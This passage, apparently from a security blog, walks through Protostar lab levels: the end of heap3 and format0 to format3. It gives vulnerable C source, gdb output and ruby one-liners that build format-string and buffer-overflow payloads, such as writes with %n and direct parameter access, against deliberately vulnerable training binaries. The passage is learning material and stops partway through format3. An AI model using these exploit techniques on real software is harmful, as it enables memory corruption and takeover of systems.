<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ /opt/protostar/bin/heap3 $(ruby -e 'print "XXXX" + "\x68\x64\x88\x04\x08\xc3"') $(ruby -e 'print "X" * 24 + "\x01" + "ABCDEFG" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + "AAAABBBB" + [0x0804b11c].pack("V") + [0x0804c00c].pack("V")') X
</span><span class='line'>that wasn't too bad now, was it? @ 1435304932
</span><span class='line'>
</span><span class='line'>user@protostar:/tmp$ ./exploit-backward.rb 
</span><span class='line'>that wasn't too bad now, was it? @ 1435304818</span></code></pre></td></tr></table></div></figure>


<hr />
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Format Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/28/exploit-exercises-protostar-format-levels/"/>
    <updated>2015-06-28T09:29:15+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/28/exploit-exercises-protostar-format-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<h2>Protostar Format0</h2>

<figure class='code'><figcaption><span>format0.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">target</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">string</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have hit the target correctly :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/format0
</span><span class='line'>...
</span><span class='line'>gdb> disassemble vuln
</span><span class='line'>Dump of assembler code for function vuln:
</span><span class='line'>0x080483f4 &lt;vuln+0>:   push   ebp
</span><span class='line'>0x080483f5 &lt;vuln+1>:   mov    ebp,esp
</span><span class='line'>0x080483f7 &lt;vuln+3>:   sub    esp,0x68
</span><span class='line'>0x080483fa &lt;vuln+6>:   mov    DWORD PTR [ebp-0xc],0x0
</span><span class='line'>0x08048401 &lt;vuln+13>:  mov    eax,DWORD PTR [ebp+0x8]
</span><span class='line'>0x08048404 &lt;vuln+16>:  mov    DWORD PTR [esp+0x4],eax
</span><span class='line'>0x08048408 &lt;vuln+20>:  lea    eax,[ebp-0x4c]
</span><span class='line'>0x0804840b &lt;vuln+23>:  mov    DWORD PTR [esp],eax
</span><span class='line'>0x0804840e &lt;vuln+26>:  call   0x8048300 &lt;sprintf@plt>
</span><span class='line'>0x08048413 &lt;vuln+31>:  mov    eax,DWORD PTR [ebp-0xc]
</span><span class='line'>0x08048416 &lt;vuln+34>:  cmp    eax,0xdeadbeef
</span><span class='line'>0x0804841b &lt;vuln+39>:  jne    0x8048429 &lt;vuln+53>
</span><span class='line'>0x0804841d &lt;vuln+41>:  mov    DWORD PTR [esp],0x8048510
</span><span class='line'>0x08048424 &lt;vuln+48>:  call   0x8048330 &lt;puts@plt>
</span><span class='line'>0x08048429 &lt;vuln+53>:  leave  
</span><span class='line'>0x0804842a &lt;vuln+54>:  ret    
</span><span class='line'>End of assembler dump.
</span><span class='line'>
</span><span class='line'>gdb> b *0x08048413
</span><span class='line'>Breakpoint 1 at 0x8048413: file format0/format0.c, line 15.
</span><span class='line'>
</span><span class='line'>gdb> r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</span><span class='line'>...
</span><span class='line'>Breakpoint 1, vuln (string=0x41386341 &lt;Address 0x41386341 out of bounds>) at format0/format0.c:15
</span><span class='line'>15    in format0/format0.c
</span><span class='line'>
</span><span class='line'>gdb> x /1xw $ebp-0xc
</span><span class='line'>0xbffff6ec:   0x63413163</span></code></pre></td></tr></table></div></figure>


<p>From the output above, we can see:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># addr of 'int target':
</span><span class='line'>0x080483fa &lt;vuln+6>:   mov    DWORD PTR [ebp-0xc],0x0
</span><span class='line'>
</span><span class='line'># addr of 'char *string':
</span><span class='line'>0x08048401 &lt;vuln+13>:  mov    eax,DWORD PTR [ebp+0x8]
</span><span class='line'>0x08048404 &lt;vuln+16>:  mov    DWORD PTR [esp+0x4],eax
</span><span class='line'>
</span><span class='line'># addr of 'char buffer[64]':
</span><span class='line'>0x08048408 &lt;vuln+20>:  lea    eax,[ebp-0x4c]</span></code></pre></td></tr></table></div></figure>


<p>Because the pattern <code>0x63413163</code> means offset 64, we could trivially pass the
challenge by overflowing <code>buffer</code> array, because <code>int target</code> follows immediately
(0x4c - 64 = 0xc):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/format0 $(ruby -e 'print "A" * 64 + [0xdeadbeef].pack("V")')
</span><span class='line'>you have hit the target correctly :)</span></code></pre></td></tr></table></div></figure>


<p>This level should be done in less than 10 bytes of input, so let&rsquo;s try similar
approach by overflowing the buffer using format string exploitation.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/format0 $(ruby -e 'print "%64x" + [0xdeadbeef].pack("V")')
</span><span class='line'>you have hit the target correctly :)
</span><span class='line'>
</span><span class='line'>user@protostar:~$ ruby -e 'print "%64x" + [0xdeadbeef].pack("V")' > /tmp/payload
</span><span class='line'>
</span><span class='line'>user@protostar:~$ wc -c /tmp/payload 
</span><span class='line'>8 /tmp/payload
</span><span class='line'>
</span><span class='line'>user@protostar:~$ /opt/protostar/bin/format0 $(cat /tmp/payload)
</span><span class='line'>you have hit the target correctly :)</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Format1</h2>

<figure class='code'><figcaption><span>format1.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have modified the target :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We want to write something to global variable <code>target</code>, stored in <code>bss</code> section. It has fixed address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ objdump -t /opt/protostar/bin/format1 | grep target
</span><span class='line'>08049638 g     O .bss 00000004              target
</span><span class='line'>
</span><span class='line'>user@protostar:~$ nm /opt/protostar/bin/format1 | grep target
</span><span class='line'>08049638 B target</span></code></pre></td></tr></table></div></figure>


<p>To find the <code>DDDD = 0x44444444</code> on the stack, after a few tries we have:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/format1 "$(ruby -e 'print "DDDD" + " %p" * 200')"
</span><span class='line'>DDDD 0x804960c 0xbffff528 0x8048469 0xb7fd8304 0xb7fd7ff4 0xbffff528 0x8048435 0xbffff718 0xb7ff1040 0x804845b 0xb7fd7ff4 0x8048450 (nil) 0xbffff5a8 0xb7eadc76 0x2 0xbffff5d4 0xbffff5e0 0xb7fe1848 0xbffff590 0xffffffff 0xb7ffeff4 0x804824d 0x1 0xbffff590 0xb7ff0626 0xb7fffab0 0xb7fe1b28 0xb7fd7ff4 (nil) (nil) 0xbffff5a8 0xcec48558 0xe4969348 (nil) (nil) (nil) 0x2 0x8048340 (nil) 0xb7ff6210 0xb7eadb9b 0xb7ffeff4 0x2 0x8048340 (nil) 0x8048361 0x804841c 0x2 0xbffff5d4 0x8048450 0x8048440 0xb7ff1040 0xbffff5cc 0xb7fff8f8 0x2 0xbffff6fd 0xbffff718 (nil) 0xbffff975 0xbffff983 0xbffff997 0xbffff9b8 0xbffff9cb 0xbffff9de 0xbffff9e8 0xbffffed8 0xbfffff16 0xbfffff2a 0xbfffff39 0xbfffff4a 0xbfffff52 0xbfffff62 0xbfffff6f 0xbfffffa3 0xbfffffb2 0xbfffffcf (nil) 0x20 0xb7fe2414 0x21 0xb7fe2000 0x10 0xfabfbff 0x6 0x1000 0x11 0x64 0x3 0x8048034 0x4 0x20 0x5 0x7 0x7 0xb7fe3000 0x8 (nil) 0x9 0x8048340 0xb 0x3e9 0xc (nil) 0xd 0x3e9 0xe 0x3e9 0x17 0x1 0x19 0xbffff6db 0x1f 0xbfffffe1 0xf 0xbffff6eb (nil) (nil) (nil) (nil) (nil) 0xd4000000 0x72facad1 0x50139897 0x39f1f921 0x695501e9 0x363836 (nil) (nil) (nil) 0x706f2f00 0x72702f74 0x736f746f 0x2f726174 0x2f6e6962 0x6d726f66 0x317461 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
</span><span class='line'>
</span><span class='line'>user@protostar:~$ /opt/protostar/bin/format1 "$(ruby -e 'print "DDDD" + " %p" * 140')" 
</span><span class='line'>DDDD 0x804960c 0xbffff5e8 0x8048469 0xb7fd8304 0xb7fd7ff4 0xbffff5e8 0x8048435 0xbffff7cc 0xb7ff1040 0x804845b 0xb7fd7ff4 0x8048450 (nil) 0xbffff668 0xb7eadc76 0x2 0xbffff694 0xbffff6a0 0xb7fe1848 0xbffff650 0xffffffff 0xb7ffeff4 0x804824d 0x1 0xbffff650 0xb7ff0626 0xb7fffab0 0xb7fe1b28 0xb7fd7ff4 (nil) (nil) 0xbffff668 0x9cacbe0e 0xb6ff281e (nil) (nil) (nil) 0x2 0x8048340 (nil) 0xb7ff6210 0xb7eadb9b 0xb7ffeff4 0x2 0x8048340 (nil) 0x8048361 0x804841c 0x2 0xbffff694 0x8048450 0x8048440 0xb7ff1040 0xbffff68c 0xb7fff8f8 0x2 0xbffff7b1 0xbffff7cc (nil) 0xbffff975 0xbffff983 0xbffff997 0xbffff9b8 0xbffff9cb 0xbffff9de 0xbffff9e8 0xbffffed8 0xbfffff16 0xbfffff2a 0xbfffff39 0xbfffff4a 0xbfffff52 0xbfffff62 0xbfffff6f 0xbfffffa3 0xbfffffb2 0xbfffffcf (nil) 0x20 0xb7fe2414 0x21 0xb7fe2000 0x10 0xfabfbff 0x6 0x1000 0x11 0x64 0x3 0x8048034 0x4 0x20 0x5 0x7 0x7 0xb7fe3000 0x8 (nil) 0x9 0x8048340 0xb 0x3e9 0xc (nil) 0xd 0x3e9 0xe 0x3e9 0x17 0x1 0x19 0xbffff79b 0x1f 0xbfffffe1 0xf 0xbffff7ab (nil) (nil) (nil) (nil) (nil) 0xd3000000 0xaf79b817 0x53b8b1a3 0x6ce5252 0x69b1ee44 0x363836 0x706f2f00 0x72702f74 0x736f746f 0x2f726174 0x2f6e6962 0x6d726f66 0x317461 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
</span><span class='line'>
</span><span class='line'>user@protostar:~$ /opt/protostar/bin/format1 "DDDD %140\$x"
</span><span class='line'>DDDD 78243034
</span><span class='line'>
</span><span class='line'>user@protostar:~$ /opt/protostar/bin/format1 "DDDD %139\$x"
</span><span class='line'>DDDD 31252044
</span><span class='line'>
</span><span class='line'>user@protostar:~$ /opt/protostar/bin/format1 "DDDD %138\$x"
</span><span class='line'>DDDD 44444400
</span><span class='line'>
</span><span class='line'>user@protostar:~$ /opt/protostar/bin/format1 "DDDD  %138\$x"
</span><span class='line'>DDDD  44444444
</span><span class='line'>
</span><span class='line'>user@protostar:~$ /opt/protostar/bin/format1 "$(ruby -e 'print "DDDD  %138\$x"')"
</span><span class='line'>DDDD  44444444
</span><span class='line'>
</span><span class='line'>user@protostar:~$ /opt/protostar/bin/format1 "$(ruby -e 'print [0x44444444].pack("V") + "  %138\$x"')"
</span><span class='line'>DDDD  44444444
</span><span class='line'>
</span><span class='line'>user@protostar:~$ /opt/protostar/bin/format1 "$(ruby -e 'print [0x08049638].pack("V") + "  %138\$x"')"
</span><span class='line'>8  8049638
</span><span class='line'>
</span><span class='line'>user@protostar:~$ /opt/protostar/bin/format1 "$(ruby -e 'print [0x08049638].pack("V") + "  %138\$n"')"
</span><span class='line'>8  you have modified the target :)</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Format2</h2>

<figure class='code'><figcaption><span>format2.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have modified the target :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;target is %d :(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">vuln</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ruby -e 'print "DDDD" + " %p" * 10' | /opt/protostar/bin/format2 
</span><span class='line'>DDDD 0x200 0xb7fd8420 0xbffff5d4 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070target is 0 :(
</span><span class='line'>
</span><span class='line'>user@protostar:~$ ruby -e 'print "DDDD %4\$p"' | /opt/protostar/bin/format2 
</span><span class='line'>DDDD 0x44444444target is 0 :(
</span><span class='line'>
</span><span class='line'>user@protostar:~$ nm /opt/protostar/bin/format2 | grep target
</span><span class='line'>080496e4 B target
</span><span class='line'>
</span><span class='line'>user@protostar:~$ ruby -e 'print [0x080496e4].pack("V") + " %4\$p"' | /opt/protostar/bin/format2
</span><span class='line'> 0x80496e4target is 0 :(
</span><span class='line'>
</span><span class='line'>user@protostar:~$ ruby -e 'print [0x080496e4].pack("V") + " %4\$n"' | /opt/protostar/bin/format2
</span><span class='line'> target is 5 :(
</span><span class='line'>
</span><span class='line'>user@protostar:~$ ruby -e 'print [0x080496e4].pack("V") + " %4\$x %4\$n"' | /opt/protostar/bin/format2
</span><span class='line'> 80496e4 target is 13 :(
</span><span class='line'>
</span><span class='line'>user@protostar:~$ ruby -e 'print [0x080496e4].pack("V") + " %4\$61x %4\$n"' | /opt/protostar/bin/format2
</span><span class='line'>                                                       80496e4 target is 67 :(
</span><span class='line'>
</span><span class='line'>user@protostar:~$ ruby -e 'print [0x080496e4].pack("V") + " %4\$58x %4\$n"' | /opt/protostar/bin/format2
</span><span class='line'>                                                    80496e4 you have modified the target :)</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Format3</h2>

<figure class='code'><figcaption><span>format3.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">printbuffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printbuffer</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mh">0x01025544</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have modified the target :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;target is %08x :(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">vuln</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ruby -e 'print "DDDD" + " %p" * 25' | /opt/protostar/bin/format3
</span><span class='line'>DDDD (nil) 0xbffff590 0xb7fd7ff4 (nil) (nil) 0xbffff798 0x804849d 0xbffff590 0x200 0xb7fd8420 0xbffff5d4 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520target is 00000000 :(
</span><span class='line'>
